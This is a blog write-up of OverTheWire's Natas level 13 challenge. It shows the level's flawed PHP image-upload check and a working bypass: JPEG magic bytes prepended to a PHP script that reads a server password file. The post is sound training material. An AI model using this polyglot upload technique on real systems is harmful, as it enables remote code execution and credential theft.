---
title: "OverTheWire Natas Level 13"
date: "2012-11-12T06:44:00-05:00"
comments: true
highlight: "true"
categories:
 - overthewire
 - wargames
 - exif
 - natas
 - php
 - hacking
aliases:
 - "/2012/11/10/overthewire-natas-level-13"
 - "/2012/11/11/overthewire-natas-level-13"
 - "/2012/11/overthewire-natas-level-13.html"
---

[Level 13](http://www.overthewire.org/wargames/natas/natas13.shtml) of [OverTheWire's](http://www.overthewire.org) Natas wargame is extremely similar to Level 12. The only difference now, is that it's validating that the file is in fact an image. This however is flawed, as exif data can be faked.

<!-- more -->

It starts out with a similar upload prompt as last time.

{{% figure class="img-responsive" src="/img/natas13_1.png" %}}

The source code is super similar to last time.

```
<html> 
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head> 
<body> 
<h1>natas13</h1> 
<div id="content"> 
For security reasons, we now only accept image files!<br/><br/> 

<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

Just like last time, I saved the HTML down to my local machine, and made 2 changes, for the url, and the filename. 

```
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>


<form enctype="multipart/form-data" action="http://natas13.natas.labs.overthewire.org/index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="file.php" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The main difference to get around the exif changing in this case, is to put the JPEG magic-bytes into the beginning of the file. I found the JPEG magic-bytes by simply googling the [JPEG](http://www.digitalpreservation.gov/formats/fdd/fdd000018.shtml) file format</a>. 

I first created a small file that contained the magic bytes. 

```
mandreko$ echo -e "\xff\xd8\xff\xe0" > jpeg_magic
```

Next, I created my PHP script to upload (same as last level, except a new file to read). 

```
<?php
$file = file_get_contents('/etc/natas_webpass/natas14');
echo "\n" . $file;
?>
```

Then to combine these files, I just used "cat". 

```
mandreko$ cat jpeg_magic upload.php > upload2.php
```

I then uploaded "upload2.php" using my local HTML form that I created.

{{% figure class="img-responsive" src="/img/natas13_2.png" %}}

Just like that, it let me past the logic to verify it was an image type. Once I clicked on the link to the uploaded file, it showed me the magic-bytes, followed by the password to the next level.

{{% figure class="img-responsive" src="/img/natas13_3.png" %}}
